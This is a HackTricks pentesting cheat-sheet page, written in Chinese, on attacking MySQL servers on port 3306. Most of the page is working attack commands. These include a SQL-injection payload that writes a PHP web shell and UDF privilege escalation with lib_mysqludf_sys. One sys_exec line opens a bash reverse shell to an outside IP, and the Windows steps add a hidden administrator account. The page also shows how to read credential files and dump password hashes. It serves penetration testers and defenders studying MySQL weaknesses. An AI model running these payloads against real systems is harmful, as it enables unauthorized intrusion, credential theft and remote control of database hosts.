<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>3306 - Pentesting Mysql</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="3306---pentesting-mysql"><a class="header" href="#3306---pentesting-mysql">3306 - Pentesting Mysql</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术： <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p><a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的事件之一。该大会的 <strong>使命是促进技术知识</strong>，是各个学科技术和网络安全专业人士的一个热烈交流点。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<h2 id="基本信息"><a class="header" href="#基本信息"><strong>基本信息</strong></a></h2>
<p><strong>MySQL</strong> 可以被描述为一个开源的 <strong>关系数据库管理系统 (RDBMS)</strong>，可免费使用。它基于 <strong>结构化查询语言 (SQL)</strong>，使得数据库的管理和操作成为可能。</p>
<p><strong>默认端口：</strong> 3306</p>
<pre><code>3306/tcp open  mysql
</code></pre>
<h2 id="连接"><a class="header" href="#连接"><strong>连接</strong></a></h2>
<h3 id="本地"><a class="header" href="#本地"><strong>本地</strong></a></h3>
<pre><code class="language-bash">mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
</code></pre>
<h3 id="远程"><a class="header" href="#远程">远程</a></h3>
<pre><code class="language-bash">mysql -h &lt;Hostname&gt; -u root
mysql -h &lt;Hostname&gt; -u root@localhost
</code></pre>
<h2 id="external-enumeration"><a class="header" href="#external-enumeration">External Enumeration</a></h2>
<p>某些枚举操作需要有效的凭据</p>
<pre><code class="language-bash">nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 &lt;IP&gt;
msf&gt; use auxiliary/scanner/mysql/mysql_version
msf&gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf&gt; use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf&gt; use auxiliary/admin/mysql/mysql_enum #Creds
msf&gt; use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf&gt; use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
</code></pre>
<h3 id="暴力破解"><a class="header" href="#暴力破解"><a href="../generic-hacking/brute-force.html#mysql"><strong>暴力破解</strong></a></a></h3>
<h3 id="写入任何二进制数据"><a class="header" href="#写入任何二进制数据">写入任何二进制数据</a></h3>
<pre><code class="language-bash">CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
</code></pre>
<h2 id="mysql-命令"><a class="header" href="#mysql-命令"><strong>MySQL 命令</strong></a></h2>
<pre><code class="language-bash">show databases;
use &lt;database&gt;;
connect &lt;database&gt;;
show tables;
describe &lt;table_name&gt;;
show columns from &lt;table&gt;;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="&lt;TABLE NAME&gt;"

#Read &amp; Write
## Yo need FILE privilege to read &amp; write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"&lt;?php echo shell_exec($_GET['c']);?&gt;",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
</code></pre>
<pre><code class="language-bash">mysql -u username -p &lt; manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
</code></pre>
<h3 id="mysql-权限枚举"><a class="header" href="#mysql-权限枚举">MySQL 权限枚举</a></h3>
<pre><code class="language-sql">#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions &amp; hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
</code></pre>
<p>您可以在文档中查看每个权限的含义：<a href="https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_execute">https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html</a></p>
<h3 id="mysql-文件-rce"><a class="header" href="#mysql-文件-rce">MySQL 文件 RCE</a></h3>
<p>{% content-ref url="../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md" %}
<a href="../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.html">mysql-ssrf.md</a>
{% endcontent-ref %}</p>
<h2 id="mysql-客户端任意读取文件"><a class="header" href="#mysql-客户端任意读取文件">MySQL 客户端任意读取文件</a></h2>
<p>实际上，当您尝试 <strong>将本地数据加载到表中</strong> 时，MySQL 或 MariaDB 服务器会要求 <strong>客户端读取它</strong> 并发送内容。<strong>然后，如果您可以篡改 mysql 客户端以连接到您自己的 MySQL 服务器，您可以读取任意文件。</strong><br />
请注意，这是使用以下方式的行为：</p>
<pre><code class="language-bash">load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
</code></pre>
<p>(注意“local”这个词)<br />
因为没有“local”你可能会得到：</p>
<pre><code class="language-bash">mysql&gt; load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
</code></pre>
<p><strong>初始 PoC:</strong> <a href="https://github.com/allyshka/Rogue-MySql-Server"><strong>https://github.com/allyshka/Rogue-MySql-Server</strong></a><br />
<strong>在这篇论文中，您可以看到攻击的完整描述，甚至如何将其扩展到 RCE:</strong> <a href="https://paper.seebug.org/1113/"><strong>https://paper.seebug.org/1113/</strong></a><br />
<strong>在这里您可以找到攻击的概述:</strong> <a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/"><strong>http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</strong></a></p>
<p>​</p>
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p>​​<a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的事件之一。该大会 <strong>旨在促进技术知识</strong>，是各个学科的技术和网络安全专业人士的热烈交流点。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<h2 id="post"><a class="header" href="#post">POST</a></h2>
<h3 id="mysql-用户"><a class="header" href="#mysql-用户">Mysql 用户</a></h3>
<p>如果 mysql 以 <strong>root</strong> 身份运行，那将非常有趣：</p>
<pre><code class="language-bash">cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2&gt;/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1
</code></pre>
<h4 id="mysqldcnf-的危险设置"><a class="header" href="#mysqldcnf-的危险设置">mysqld.cnf 的危险设置</a></h4>
<p>在 MySQL 服务的配置中，使用各种设置来定义其操作和安全措施：</p>
<ul>
<li><strong><code>user</code></strong> 设置用于指定 MySQL 服务将以哪个用户身份执行。</li>
<li><strong><code>password</code></strong> 用于建立与 MySQL 用户相关联的密码。</li>
<li><strong><code>admin_address</code></strong> 指定在管理网络接口上监听 TCP/IP 连接的 IP 地址。</li>
<li><strong><code>debug</code></strong> 变量指示当前的调试配置，包括日志中的敏感信息。</li>
<li><strong><code>sql_warnings</code></strong> 管理在出现警告时是否为单行 INSERT 语句生成信息字符串，日志中包含敏感数据。</li>
<li>使用 <strong><code>secure_file_priv</code></strong>，数据导入和导出操作的范围受到限制，以增强安全性。</li>
</ul>
<h3 id="权限提升"><a class="header" href="#权限提升">权限提升</a></h3>
<pre><code class="language-bash"># Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# Get users, permissions &amp; creds
SELECT * FROM mysql.user;
mysql -u root --password=&lt;PASSWORD&gt; -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
</code></pre>
<h3 id="特权提升通过库"><a class="header" href="#特权提升通过库">特权提升通过库</a></h3>
<p>如果 <strong>mysql 服务器以 root 身份运行</strong>（或其他更高权限的用户），您可以使其执行命令。为此，您需要使用 <strong>用户定义函数</strong>。要创建用户定义函数，您需要一个 <strong>库</strong>，该库适用于运行 mysql 的操作系统。</p>
<p>可以在 sqlmap 和 metasploit 中找到要使用的恶意库，通过执行 <strong><code>locate "*lib_mysqludf_sys*"</code></strong>。<strong><code>.so</code></strong> 文件是 <strong>linux</strong> 库，<strong><code>.dll</code></strong> 是 <strong>Windows</strong> 库，选择您需要的。</p>
<p>如果您 <strong>没有</strong> 这些库，您可以 <strong>寻找它们</strong>，或下载这个 <a href="https://www.exploit-db.com/exploits/1518"><strong>linux C 代码</strong></a> 并 <strong>在 linux 漏洞机器中编译</strong>：</p>
<pre><code class="language-bash">gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
</code></pre>
<p>现在您已经有了库，作为特权用户（root？）登录到Mysql，并按照以下步骤操作：</p>
<h4 id="linux"><a class="header" href="#linux">Linux</a></h4>
<pre><code class="language-sql"># Use a database
use mysql;
# Create a table to load the library and move it to the plugins dir
create table npn(line blob);
# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
# Get the plugin_dir path
show variables like '%plugin%';
# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
# Execute commands
select sys_exec('id &gt; /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.66/1234 0&gt;&amp;1"');
</code></pre>
<h4 id="windows"><a class="header" href="#windows">Windows</a></h4>
<pre><code class="language-sql"># CHech the linux comments for more indications
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
</code></pre>
<h3 id="从文件中提取-mysql-凭据"><a class="header" href="#从文件中提取-mysql-凭据">从文件中提取 MySQL 凭据</a></h3>
<p>在 <em>/etc/mysql/debian.cnf</em> 中，您可以找到用户 <strong>debian-sys-maint</strong> 的 <strong>明文密码</strong>。</p>
<pre><code class="language-bash">cat /etc/mysql/debian.cnf
</code></pre>
<p>您可以<strong>使用这些凭据登录mysql数据库</strong>。</p>
<p>在文件：_ /var/lib/mysql/mysql/user.MYD <em>中，您可以找到<strong>所有MySQL用户的哈希值</strong>（您可以从数据库中的mysql.user提取的那些）</em>。</p>
<p>您可以通过以下方式提取它们：</p>
<pre><code class="language-bash">grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
</code></pre>
<h3 id="启用日志记录"><a class="header" href="#启用日志记录">启用日志记录</a></h3>
<p>您可以通过取消注释以下行在 <code>/etc/mysql/my.cnf</code> 中启用 mysql 查询的日志记录：</p>
<p><img src="../.gitbook/assets/image%20(899).png" alt="" /></p>
<h3 id="有用的文件"><a class="header" href="#有用的文件">有用的文件</a></h3>
<p>配置文件</p>
<ul>
<li>windows *</li>
<li>config.ini</li>
<li>my.ini</li>
<li>windows\my.ini</li>
<li>winnt\my.ini</li>
<li>&lt;InstDir&gt;/mysql/data/</li>
<li>unix</li>
<li>my.cnf</li>
<li>/etc/my.cnf</li>
<li>/etc/mysql/my.cnf</li>
<li>/var/lib/mysql/my.cnf</li>
<li>~/.my.cnf</li>
<li>/etc/my.cnf</li>
<li>命令历史</li>
<li>~/.mysql.history</li>
<li>日志文件</li>
<li>connections.log</li>
<li>update.log</li>
<li>common.log</li>
</ul>
<h2 id="默认-mysql-数据库表"><a class="header" href="#默认-mysql-数据库表">默认 MySQL 数据库/表</a></h2>
<p>{% tabs %}
{% tab title="information_schema" %}
ALL_PLUGINS<br />
APPLICABLE_ROLES<br />
CHARACTER_SETS<br />
CHECK_CONSTRAINTS<br />
COLLATIONS<br />
COLLATION_CHARACTER_SET_APPLICABILITY<br />
COLUMNS<br />
COLUMN_PRIVILEGES<br />
ENABLED_ROLES<br />
ENGINES<br />
EVENTS<br />
FILES<br />
GLOBAL_STATUS<br />
GLOBAL_VARIABLES<br />
KEY_COLUMN_USAGE<br />
KEY_CACHES<br />
OPTIMIZER_TRACE<br />
PARAMETERS<br />
PARTITIONS<br />
PLUGINS<br />
PROCESSLIST<br />
PROFILING<br />
REFERENTIAL_CONSTRAINTS<br />
ROUTINES<br />
SCHEMATA<br />
SCHEMA_PRIVILEGES<br />
SESSION_STATUS<br />
SESSION_VARIABLES<br />
STATISTICS<br />
SYSTEM_VARIABLES<br />
TABLES<br />
TABLESPACES<br />
TABLE_CONSTRAINTS<br />
TABLE_PRIVILEGES<br />
TRIGGERS<br />
USER_PRIVILEGES<br />
VIEWS<br />
INNODB_LOCKS<br />
INNODB_TRX<br />
INNODB_SYS_DATAFILES<br />
INNODB_FT_CONFIG<br />
INNODB_SYS_VIRTUAL<br />
INNODB_CMP<br />
INNODB_FT_BEING_DELETED<br />
INNODB_CMP_RESET<br />
INNODB_CMP_PER_INDEX<br />
INNODB_CMPMEM_RESET<br />
INNODB_FT_DELETED<br />
INNODB_BUFFER_PAGE_LRU<br />
INNODB_LOCK_WAITS<br />
INNODB_TEMP_TABLE_INFO<br />
INNODB_SYS_INDEXES<br />
INNODB_SYS_TABLES<br />
INNODB_SYS_FIELDS<br />
INNODB_CMP_PER_INDEX_RESET<br />
INNODB_BUFFER_PAGE<br />
INNODB_FT_DEFAULT_STOPWORD<br />
INNODB_FT_INDEX_TABLE<br />
INNODB_FT_INDEX_CACHE<br />
INNODB_SYS_TABLESPACES<br />
INNODB_METRICS<br />
INNODB_SYS_FOREIGN_COLS<br />
INNODB_CMPMEM<br />
INNODB_BUFFER_POOL_STATS<br />
INNODB_SYS_COLUMNS<br />
INNODB_SYS_FOREIGN<br />
INNODB_SYS_TABLESTATS<br />
GEOMETRY_COLUMNS<br />
SPATIAL_REF_SYS<br />
CLIENT_STATISTICS<br />
INDEX_STATISTICS<br />
USER_STATISTICS<br />
INNODB_MUTEXES<br />
TABLE_STATISTICS<br />
INNODB_TABLESPACES_ENCRYPTION<br />
user_variables<br />
INNODB_TABLESPACES_SCRUBBING<br />
INNODB_SYS_SEMAPHORE_WAITS
{% endtab %}</p>
<p>{% tab title="mysql" %}
columns_priv<br />
column_stats<br />
db<br />
engine_cost<br />
event<br />
func<br />
general_log<br />
gtid_executed<br />
gtid_slave_pos<br />
help_category<br />
help_keyword<br />
help_relation<br />
help_topic<br />
host<br />
index_stats<br />
innodb_index_stats<br />
innodb_table_stats<br />
ndb_binlog_index<br />
plugin<br />
proc<br />
procs_priv<br />
proxies_priv<br />
roles_mapping<br />
server_cost<br />
servers<br />
slave_master_info<br />
slave_relay_log_info<br />
slave_worker_info<br />
slow_log<br />
tables_priv<br />
table_stats<br />
time_zone<br />
time_zone_leap_second<br />
time_zone_name<br />
time_zone_transition<br />
time_zone_transition_type<br />
transaction_registry<br />
user
{% endtab %}</p>
<p>{% tab title="performance_schema" %}
accounts<br />
cond_instances<br />
events_stages_current<br />
events_stages_history<br />
events_stages_history_long<br />
events_stages_summary_by_account_by_event_name<br />
events_stages_summary_by_host_by_event_name<br />
events_stages_summary_by_thread_by_event_name<br />
events_stages_summary_by_user_by_event_name<br />
events_stages_summary_global_by_event_name<br />
events_statements_current<br />
events_statements_history<br />
events_statements_history_long<br />
events_statements_summary_by_account_by_event_name<br />
events_statements_summary_by_digest<br />
events_statements_summary_by_host_by_event_name<br />
events_statements_summary_by_program<br />
events_statements_summary_by_thread_by_event_name<br />
events_statements_summary_by_user_by_event_name<br />
events_statements_summary_global_by_event_name<br />
events_transactions_current<br />
events_transactions_history<br />
events_transactions_history_long<br />
events_transactions_summary_by_account_by_event_name<br />
events_transactions_summary_by_host_by_event_name<br />
events_transactions_summary_by_thread_by_event_name<br />
events_transactions_summary_by_user_by_event_name<br />
events_transactions_summary_global_by_event_name<br />
events_waits_current<br />
events_waits_history<br />
events_waits_history_long<br />
events_waits_summary_by_account_by_event_name<br />
events_waits_summary_by_host_by_event_name<br />
events_waits_summary_by_instance<br />
events_waits_summary_by_thread_by_event_name<br />
events_waits_summary_by_user_by_event_name<br />
events_waits_summary_global_by_event_name<br />
file_instances<br />
file_summary_by_event_name<br />
file_summary_by_instance<br />
global_status<br />
global_variables<br />
host_cache<br />
hosts<br />
memory_summary_by_account_by_event_name<br />
memory_summary_by_host_by_event_name<br />
memory_summary_by_thread_by_event_name<br />
memory_summary_by_user_by_event_name<br />
memory_summary_global_by_event_name<br />
metadata_locks<br />
mutex_instances<br />
objects_summary_global_by_type<br />
performance_timers<br />
prepared_statements_instances<br />
replication_applier_configuration<br />
replication_applier_status<br />
replication_applier_status_by_coordinator<br />
replication_applier_status_by_worker<br />
replication_connection_configuration<br />
replication_connection_status<br />
replication_group_member_stats<br />
replication_group_members<br />
rwlock_instances<br />
session_account_connect_attrs<br />
session_connect_attrs<br />
session_status<br />
session_variables<br />
setup_actors<br />
setup_consumers<br />
setup_instruments<br />
setup_objects<br />
setup_timers<br />
socket_instances<br />
socket_summary_by_event_name<br />
socket_summary_by_instance<br />
status_by_account<br />
status_by_host<br />
status_by_thread<br />
status_by_user<br />
table_handles<br />
table_io_waits_summary_by_index_usage<br />
table_io_waits_summary_by_table<br />
table_lock_waits_summary_by_table<br />
threads<br />
user_variables_by_thread<br />
users<br />
variables_by_thread
{% endtab %}</p>
<p>{% tab title="sys" %}
host_summary<br />
host_summary_by_file_io<br />
host_summary_by_file_io_type<br />
host_summary_by_stages<br />
host_summary_by_statement_latency<br />
host_summary_by_statement_type<br />
innodb_buffer_stats_by_schema<br />
innodb_buffer_stats_by_table<br />
innodb_lock_waits<br />
io_by_thread_by_latency<br />
io_global_by_file_by_bytes<br />
io_global_by_file_by_latency<br />
io_global_by_wait_by_bytes<br />
io_global_by_wait_by_latency<br />
latest_file_io<br />
memory_by_host_by_current_bytes<br />
memory_by_thread_by_current_bytes<br />
memory_by_user_by_current_bytes<br />
memory_global_by_current_bytes<br />
memory_global_total<br />
metrics<br />
processlist<br />
ps_check_lost_instrumentation<br />
schema_auto_increment_columns<br />
schema_index_statistics<br />
schema_object_overview<br />
schema_redundant_indexes<br />
schema_table_lock_waits<br />
schema_table_statistics<br />
schema_table_statistics_with_buffer<br />
schema_tables_with_full_table_scans<br />
schema_unused_indexes<br />
session<br />
session_ssl_status<br />
statement_analysis<br />
statements_with_errors_or_warnings<br />
statements_with_full_table_scans<br />
statements_with_runtimes_in_95th_percentile<br />
statements_with_sorting<br />
statements_with_temp_tables<br />
sys_config<br />
user_summary<br />
user_summary_by_file_io<br />
user_summary_by_file_io_type<br />
user_summary_by_stages<br />
user_summary_by_statement_latency<br />
user_summary_by_statement_type<br />
version<br />
wait_classes_global_by_avg_latency<br />
wait_classes_global_by_latency<br />
waits_by_host_by_latency<br />
waits_by_user_by_latency<br />
waits_global_by_latency<br />
x$host_summary<br />
x$host_summary_by_file_io<br />
x$host_summary_by_file_io_type<br />
x$host_summary_by_stages<br />
x$host_summary_by_statement_latency<br />
x$host_summary_by_statement_type<br />
x$innodb_buffer_stats_by_schema<br />
x$innodb_buffer_stats_by_table<br />
x$innodb_lock_waits<br />
x$io_by_thread_by_latency<br />
x$io_global_by_file_by_bytes<br />
x$io_global_by_file_by_latency<br />
x$io_global_by_wait_by_bytes<br />
x$io_global_by_wait_by_latency<br />
x$latest_file_io<br />
x$memory_by_host_by_current_bytes<br />
x$memory_by_thread_by_current_bytes<br />
x$memory_by_user_by_current_bytes<br />
x$memory_global_by_current_bytes<br />
x$memory_global_total<br />
x$processlist<br />
x$ps_digest_95th_percentile_by_avg_us<br />
x$ps_digest_avg_latency_distribution<br />
x$ps_schema_table_statistics_io<br />
x$schema_flattened_keys<br />
x$schema_index_statistics<br />
x$schema_table_lock_waits<br />
x$schema_table_statistics<br />
x$schema_table_statistics_with_buffer<br />
x$schema_tables_with_full_table_scans<br />
x$session<br />
x$statement_analysis<br />
x$statements_with_errors_or_warnings<br />
x$statements_with_full_table_scans<br />
x$statements_with_runtimes_in_95th_percentile<br />
x$statements_with_sorting<br />
x$statements_with_temp_tables<br />
x$user_summary<br />
x$user_summary_by_file_io<br />
x$user_summary_by_file_io_type<br />
x$user_summary_by_stages<br />
x$user_summary_by_statement_latency<br />
x$user_summary_by_statement_type<br />
x$wait_classes_global_by_avg_latency<br />
x$wait_classes_global_by_latency<br />
x$waits_by_host_by_latency<br />
x$waits_by_user_by_latency<br />
x$waits_global_by_latency
{% endtab %}
{% endtabs %}</p>
<h2 id="hacktricks-自动命令"><a class="header" href="#hacktricks-自动命令">HackTricks 自动命令</a></h2>
<pre><code>Protocol_Name: MySql    #Protocol Abbreviation if there is one.
Port_Number:  3306     #Comma separated if there is more than one.
Protocol_Description: MySql     #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MySql
Note: |
MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).

https://book.hacktricks.xyz/pentesting/pentesting-mysql

Entry_2:
Name: Nmap
Description: Nmap with MySql Scripts
Command: nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306

Entry_3:
Name: MySql
Description: Attempt to connect to mysql server
Command: mysql -h {IP} -u {Username}@localhost

